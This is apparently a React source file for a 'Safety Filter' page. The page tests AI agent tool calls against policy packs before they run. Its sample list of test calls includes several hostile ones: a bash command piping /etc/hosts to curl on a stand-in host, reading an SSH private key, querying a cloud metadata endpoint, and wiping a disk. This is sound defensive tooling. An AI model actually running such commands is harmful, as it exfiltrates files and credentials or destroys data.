import { useCallback, useEffect, useMemo, useState } from 'react'
import { useSearchParams } from 'react-router-dom'
import { Gavel, Play, RotateCcw, Loader2, AlertCircle, CheckCircle2, Download, Copy } from 'lucide-react'
import PageGuide from '../../../components/PageGuide'
import {
  guardCheck, guardDecisions, guardPolicies, guardReset, guardValidate, guardClientUrl,
  type GuardDecision, type GuardLogEntry, type GuardPolicy, type Verdict,
} from '../guardApi'
import ApprovalsTab from './guard/ApprovalsTab'
import RegistryTab from './guard/RegistryTab'
import EvaluateTab from './guard/EvaluateTab'
import EvidenceTab from './guard/EvidenceTab'

const TABS = [
  { id: 'test', label: 'Test' },
  { id: 'approvals', label: 'Approvals' },
  { id: 'registry', label: 'Tool Registry' },
  { id: 'evaluate', label: 'Evaluate' },
  { id: 'evidence', label: 'Evidence' },
] as const
type TabId = typeof TABS[number]['id']

const VERDICT_STYLE: Record<Verdict, string> = {
  allow: 'bg-accent-green/15 text-accent-green border-accent-green/30',
  modify: 'bg-accent-blue/15 text-accent-blue border-accent-blue/30',
  ask: 'bg-accent-amber/15 text-accent-amber border-accent-amber/30',
  deny: 'bg-accent-red/15 text-accent-red border-accent-red/30',
}
const VERDICT_TEXT: Record<Verdict, string> = {
  allow: 'Allow: the call runs as proposed',
  modify: 'Modify: the call runs with corrected arguments',
  ask: 'Ask: a human must approve before it runs',
  deny: 'Deny: the call does not run',
}

interface Sample { label: string; tool: string; args: Record<string, unknown> }

const SAMPLES: Record<string, Sample[]> = {
  'soc-triage': [
    { label: 'Query the graph', tool: 'get_entity', args: { entity_id: 'proc-7f3a' } },
    { label: 'Isolate a host', tool: 'isolate_host', args: { host: '10.0.4.17', reasoning: 'beaconing to rare domain' } },
    { label: 'Isolate everything', tool: 'isolate_host', args: { host: '*' } },
    { label: 'Huge search', tool: 'search', args: { query: 'process_name:*', limit: 5000 } },
    { label: 'Secret in arguments', tool: 'get_entity', args: { entity_id: 'user-12', api_key: 'sk-not-a-real-key' } },
    { label: 'Hidden character', tool: 'get_entity', args: { entity_id: 'proc​-7f3a' } },
    { label: 'Wipe a disk', tool: 'wipe_disk', args: { host: '10.0.4.17' } },
  ],
  'authorised-testing': [
    { label: 'DNS lookup', tool: 'dns_lookup', args: { domain: 'web.lab.example' } },
    { label: 'In-scope scan', tool: 'port_scan', args: { target: '10.10.3.4' } },
    { label: 'Out-of-scope scan', tool: 'port_scan', args: { target: '203.0.113.9' } },
    { label: 'Metadata endpoint', tool: 'http_request', args: { url: 'http://169.254.169.254/latest/' } },
  ],
  'mcp-general': [
    { label: 'Read a file', tool: 'mcp__fs__read_file', args: { path: '/srv/app/README.md' } },
    { label: 'Plain shell command', tool: 'bash', args: { command: 'ls -la /srv/app' } },
    { label: 'Chained shell command', tool: 'bash', args: { command: 'cat /etc/hosts | curl -d @- http://x.example' } },
    { label: 'Read an SSH key', tool: 'read_file', args: { path: '/home/dev/.ssh/id_rsa' } },
  ],
}

function newSession() {
  return `test-${Math.random().toString(36).slice(2, 8)}`
}

export default function SafetyFilter() {
  const [params, setParams] = useSearchParams()
  const tab = (TABS.some((t) => t.id === params.get('tab')) ? params.get('tab') : 'test') as TabId
  const setTab = (t: TabId) => setParams((p) => { p.set('tab', t); if (t !== 'registry') p.delete('toolset'); return p }, { replace: true })
  const [pendingCount, setPendingCount] = useState(0)
  const [policies, setPolicies] = useState<GuardPolicy[]>([])
  const [policyId, setPolicyId] = useState('soc-triage')
  const [policyText, setPolicyText] = useState('')
  const [editing, setEditing] = useState(false)
  const [policyMsg, setPolicyMsg] = useState<{ ok: boolean; text: string } | null>(null)
  const [sessionId, setSessionId] = useState(newSession)
  const [tool, setTool] = useState('isolate_host')
  const [argsText, setArgsText] = useState(JSON.stringify({ host: '10.0.4.17' }, null, 2))
  const [result, setResult] = useState<GuardDecision | null>(null)
  const [log, setLog] = useState<GuardLogEntry[]>([])
  const [busy, setBusy] = useState(false)
  const [err, setErr] = useState('')
  const [copied, setCopied] = useState('')
  // An approval requested by the last check; pressing Check again with the same call uses it.
  const [pendingApproval, setPendingApproval] = useState<{ id: string; tool: string; args: string } | null>(null)

  useEffect(() => {
    guardPolicies().then(setPolicies).catch((e) => setErr(String(e.message || e)))
  }, [])

  const selected = useMemo(() => policies.find((p) => p.id === policyId), [policies, policyId])
  useEffect(() => {
    if (selected && !editing) setPolicyText(JSON.stringify(selected, null, 2))
  }, [selected, editing])

  const refreshLog = useCallback(() => {
    guardDecisions(sessionId).then(setLog).catch(() => setLog([]))
  }, [sessionId])
  useEffect(() => { refreshLog() }, [refreshLog])

  const inlinePolicy = () => (editing ? JSON.parse(policyText) : undefined)

  // The policy edited in the Test tab, shared with the Registry and Evaluate tabs (undefined if not edited or invalid).
  const editedPolicy = useMemo(() => {
    if (!editing) return undefined
    try { return JSON.parse(policyText) } catch { return undefined }
  }, [editing, policyText])

  const usePolicy = (p: GuardPolicy) => {
    setPolicyText(JSON.stringify(p, null, 2)); setEditing(true)
    setPolicyMsg({ ok: true, text: 'Loaded the generated policy. Validate it, then try calls against it.' })
    setTab('test')
  }

  const runCheck = async () => {
    setErr(''); setBusy(true)
    try {
      let args: Record<string, unknown>
      try { args = JSON.parse(argsText || '{}') } catch { throw new Error('Arguments are not valid JSON') }
      const reuse = pendingApproval && pendingApproval.tool === tool && pendingApproval.args === argsText
        ? pendingApproval.id : undefined
      const d = await guardCheck({ session_id: sessionId, tool_name: tool, args, policy_id: policyId,
                                   policy: inlinePolicy(), framework: 'test-page', approval_id: reuse })
      setResult(d)
      setPendingApproval(d.decision === 'ask' && d.approval_id ? { id: d.approval_id, tool, args: argsText }
        : d.findings.some((f) => f.reason.includes('still pending')) ? pendingApproval : null)
      refreshLog()
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e))
    } finally {
      setBusy(false)
    }
  }

  const validate = async () => {
    try {
      const r = await guardValidate(JSON.parse(policyText))
      setPolicyMsg(r.valid ? { ok: true, text: 'Policy is valid. Checks now use your edited version.' }
                           : { ok: false, text: r.errors.join('; ') })
    } catch (e) {
      setPolicyMsg({ ok: false, text: e instanceof Error ? e.message : 'Not valid JSON' })
    }
  }

  const resetSession = async () => {
    await guardReset(sessionId).catch(() => {})
    setResult(null)
    refreshLog()
  }

  const loadSample = (s: Sample) => {
    setTool(s.tool)
    setArgsText(JSON.stringify(s.args, null, 2))
  }

  const copy = (key: string, text: string) => {
    navigator.clipboard?.writeText(text).then(() => { setCopied(key); setTimeout(() => setCopied(''), 1500) })
  }

  const hookConfig = JSON.stringify({
    hooks: { PreToolUse: [{ matcher: '*', hooks: [{ type: 'command',
      command: `python /path/to/agent_guard_client.py hook --policy ${policyId}` }] }] },
  }, null, 2)
  const pythonSnippet = `from agent_guard_client import GuardClient, GuardDenied

guard = GuardClient("${window.location.origin}", token="<your token or rids_live_ key>",
                    session_id="run-42", policy_id="${policyId}")

verdict = guard.check("isolate_host", {"host": "10.0.4.17"})
# allow | modify (use verdict["modified_args"]) | ask (get a human) | deny

@guard.tool              # or wrap your own tool functions
def isolate_host(host: str): ...`

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-display font-bold flex items-center gap-2">
          <Gavel className="w-6 h-6 text-accent-blue" /> Safety Filter
        </h1>
        <p className="text-text-secondary text-sm mt-1 max-w-3xl">
          A fail-closed check that runs before an agent's tool call. It answers allow, modify, ask or deny from a
          policy pack, and denies on any error, timeout or repeat of a denied call. Connect any agent through the
          API, a Claude-style hook (Claude Code, Hermes Agent) or the Python client.
        </p>
      </div>

      <PageGuide
        title="How to use the Safety Filter"
        steps={[
          { title: 'Pick a policy pack', desc: 'SOC triage, authorised testing (fill in your scope) or a general MCP / coding agent. Edit the JSON to try your own rules.' },
          { title: 'Propose a tool call', desc: 'Use a sample or type a tool name and its arguments, then press Check. Nothing is executed: this page only asks the filter.' },
          { title: 'Read the verdict', desc: 'Each finding names the rule that fired. The strictest finding decides the verdict.' },
          { title: 'Try to repeat a denied call', desc: 'It stays denied. After several denials in one session, even harmless calls need approval until you reset the session.' },
          { title: 'Connect your agent', desc: 'Download the client below and add it as a pre-tool hook, or call /api/agent-guard/check from your own code.' },
        ]}
        tip="The filter judges what a call does and where it points, never the names inside your telemetry, so renaming an artefact cannot change a verdict."
      />

      <div className="flex flex-wrap gap-1 border-b border-bg-card">
        {TABS.map((t) => (
          <button key={t.id} onClick={() => setTab(t.id)}
                  className={`px-4 py-2 text-sm font-medium -mb-px border-b-2 ${tab === t.id ? 'border-accent-blue text-accent-blue' : 'border-transparent text-text-secondary hover:text-text-primary'}`}>
            {t.label}
            {t.id === 'approvals' && pendingCount > 0 && (
              <span className="ml-1.5 px-1.5 rounded-full bg-accent-amber/20 text-accent-amber text-[10px]">{pendingCount}</span>
            )}
          </button>
        ))}
      </div>

      {tab === 'approvals' && <ApprovalsTab onCount={setPendingCount} />}
      {tab === 'registry' && (
        <RegistryTab policies={policies} policyId={policyId} inlinePolicy={editedPolicy}
                     initialToolset={params.get('toolset') || undefined} onUsePolicy={usePolicy} />
      )}
      {tab === 'evaluate' && <EvaluateTab policies={policies} policyId={policyId} inlinePolicy={editedPolicy} />}
      {tab === 'evidence' && <EvidenceTab />}

      {tab === 'test' && <>
      {err && (
        <div className="flex items-center gap-2 px-3 py-2 bg-accent-red/10 border border-accent-red/30 rounded-lg text-accent-red text-sm">
          <AlertCircle className="w-4 h-4 shrink-0" /> {err}
        </div>
      )}

      <div className="grid lg:grid-cols-2 gap-6">
        {/* Policy */}
        <div className="bg-bg-card rounded-xl p-5 space-y-3">
          <div className="flex items-center gap-3">
            <h2 className="font-semibold mr-auto">Policy pack</h2>
            <select
              value={policyId}
              onChange={(e) => { setPolicyId(e.target.value); setEditing(false); setPolicyMsg(null); setResult(null) }}
              className="px-3 py-1.5 bg-bg-primary border border-bg-card rounded-lg text-sm"
            >
              {policies.map((p) => <option key={p.id} value={p.id}>{p.name || p.id}</option>)}
            </select>
          </div>
          {selected && <p className="text-xs text-text-secondary">{selected.description}</p>}
          <textarea
            value={policyText}
            onChange={(e) => { setPolicyText(e.target.value); setEditing(true); setPolicyMsg(null) }}
            spellCheck={false}
            className="w-full h-72 px-3 py-2 bg-bg-primary border border-bg-card rounded-lg font-mono text-xs"
          />
          <div className="flex items-center gap-3 text-xs">
            <button onClick={validate} className="px-3 py-1.5 bg-accent-blue/15 text-accent-blue rounded-lg font-medium">Validate</button>
            {editing && (
              <button onClick={() => { setEditing(false); setPolicyMsg(null) }} className="text-text-secondary hover:underline">
                Discard edits
              </button>
            )}
            <span className="text-text-secondary">{editing ? 'Using your edited policy' : 'Using the built-in pack'}</span>
          </div>
          {policyMsg && (
            <p className={`text-xs ${policyMsg.ok ? 'text-accent-green' : 'text-accent-red'}`}>{policyMsg.text}</p>
          )}
        </div>

        {/* Proposed call */}
        <div className="bg-bg-card rounded-xl p-5 space-y-3">
          <h2 className="font-semibold">Proposed tool call</h2>
          <div className="flex flex-wrap gap-2">
            {(SAMPLES[policyId] || []).map((s) => (
              <button key={s.label} onClick={() => loadSample(s)}
                className="px-2.5 py-1 text-xs rounded-full border border-accent-blue/30 text-accent-blue hover:bg-accent-blue/10">
                {s.label}
              </button>
            ))}
          </div>
          <div className="grid grid-cols-2 gap-3">
            <label className="text-xs text-text-secondary">Tool name
              <input value={tool} onChange={(e) => setTool(e.target.value)}
                className="mt-1 w-full px-3 py-2 bg-bg-primary border border-bg-card rounded-lg font-mono text-sm text-text-primary" />
            </label>
            <label className="text-xs text-text-secondary">Session
              <div className="mt-1 flex gap-2">
                <input value={sessionId} onChange={(e) => setSessionId(e.target.value)}
                  className="w-full px-3 py-2 bg-bg-primary border border-bg-card rounded-lg font-mono text-sm text-text-primary" />
                <button onClick={resetSession} title="Reset this session (budget, denials, escalation)"
                  className="px-2 rounded-lg bg-bg-primary text-text-secondary hover:text-text-primary">
                  <RotateCcw className="w-4 h-4" />
                </button>
              </div>
            </label>
          </div>
          <label className="block text-xs text-text-secondary">Arguments (JSON)
            <textarea value={argsText} onChange={(e) => setArgsText(e.target.value)} spellCheck={false}
              className="mt-1 w-full h-32 px-3 py-2 bg-bg-primary border border-bg-card rounded-lg font-mono text-xs text-text-primary" />
          </label>
          <button onClick={runCheck} disabled={busy || !tool}
            className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-accent-blue hover:bg-accent-blue/90 text-white rounded-lg text-sm font-medium disabled:opacity-50">
            {busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />} Check
          </button>

          {result && (
            <div className="space-y-3 pt-2">
              <div className={`px-3 py-2 rounded-lg border text-sm font-semibold ${VERDICT_STYLE[result.decision]}`}>
                {VERDICT_TEXT[result.decision]}
                <span className="ml-2 font-normal opacity-80">risk {result.risk} · tier {result.tier || 'n/a'} · {result.latency_ms} ms</span>
              </div>
              <ul className="text-sm space-y-1">
                {result.findings.map((f, i) => (
                  <li key={i} className="flex gap-2">
                    <span className={`shrink-0 px-1.5 rounded border text-[10px] uppercase ${VERDICT_STYLE[f.verdict]}`}>{f.verdict}</span>
                    <span className="font-mono text-xs text-text-secondary shrink-0">{f.rule_id}</span>
                    <span>{f.reason}</span>
                  </li>
                ))}
              </ul>
              {result.approval_id && (
                <p className="text-xs text-accent-amber">
                  Approval request queued.{' '}
                  <button onClick={() => setTab('approvals')} className="underline">Review it in Approvals</button>, then press Check
                  again: the approved call is allowed once (the agent clients do this automatically).
                </p>
              )}
              {result.hidden_characters.length > 0 && (
                <p className="text-xs text-accent-amber">Hidden characters removed: {result.hidden_characters.join(' · ')}</p>
              )}
              {result.modified_args && (
                <div>
                  <p className="text-xs text-text-secondary mb-1">Arguments the call would run with:</p>
                  <pre className="text-xs bg-bg-primary rounded-lg p-2 overflow-x-auto">{JSON.stringify(result.modified_args, null, 2)}</pre>
                </div>
              )}
              <p className="text-[11px] text-text-secondary">
                Call {result.session_calls} in session · policy {result.policy_id} v{result.policy_version} · filter {result.filter_version}
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Session log */}
      <div className="bg-bg-card rounded-xl p-5">
        <h2 className="font-semibold mb-3">Decisions in this session</h2>
        {log.length === 0 ? (
          <p className="text-sm text-text-secondary">No checks yet.</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="text-xs text-text-secondary text-left">
                <tr><th className="py-1 pr-3">Time</th><th className="pr-3">Tool</th><th className="pr-3">Verdict</th><th>Rules</th></tr>
              </thead>
              <tbody>
                {log.map((e, i) => (
                  <tr key={i} className="border-t border-bg-primary">
                    <td className="py-1.5 pr-3 text-xs text-text-secondary">{new Date(e.t * 1000).toLocaleTimeString()}</td>
                    <td className="pr-3 font-mono text-xs">{e.tool_name}</td>
                    <td className="pr-3"><span className={`px-1.5 rounded border text-[10px] uppercase ${VERDICT_STYLE[e.decision]}`}>{e.decision}</span></td>
                    <td className="font-mono text-xs text-text-secondary">{e.findings.filter((f) => f.verdict !== 'allow').map((f) => f.rule_id).join(', ') || '-'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Integration */}
      <div className="bg-bg-card rounded-xl p-5 space-y-4">
        <div className="flex items-center gap-3">
          <h2 className="font-semibold mr-auto">Connect your agent</h2>
          <a href={guardClientUrl} className="inline-flex items-center gap-1.5 text-sm text-accent-blue hover:underline">
            <Download className="w-4 h-4" /> agent_guard_client.py
          </a>
        </div>
        <p className="text-sm text-text-secondary">
          One small Python file, no dependencies. If the guard cannot be reached or answers badly, the client denies the call.
        </p>
        <div className="grid lg:grid-cols-2 gap-4">
          <div>
            <div className="flex items-center justify-between mb-1">
              <p className="text-xs text-text-secondary">Claude Code (.claude/settings.json); Hermes shell hooks take the same JSON</p>
              <button onClick={() => copy('hook', hookConfig)} className="text-xs text-accent-blue inline-flex items-center gap-1">
                {copied === 'hook' ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />} Copy
              </button>
            </div>
            <pre className="text-xs bg-bg-primary rounded-lg p-3 overflow-x-auto">{hookConfig}</pre>
            <p className="text-[11px] text-text-secondary mt-1">
              Set AGENT_GUARD_URL={window.location.origin} and AGENT_GUARD_TOKEN in the agent's environment.
            </p>
          </div>
          <div>
            <div className="flex items-center justify-between mb-1">
              <p className="text-xs text-text-secondary">Python agents (LangGraph, smolagents, your own loop)</p>
              <button onClick={() => copy('py', pythonSnippet)} className="text-xs text-accent-blue inline-flex items-center gap-1">
                {copied === 'py' ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />} Copy
              </button>
            </div>
            <pre className="text-xs bg-bg-primary rounded-lg p-3 overflow-x-auto">{pythonSnippet}</pre>
            <p className="text-[11px] text-text-secondary mt-1">
              OpenHands: map the verdict to a risk level (allow LOW, modify MEDIUM, ask and deny HIGH) in a security analyzer;
              the hook endpoint returns it as agentGuard.openhands_risk.
            </p>
          </div>
        </div>
      </div>
      </>}
    </div>
  )
}
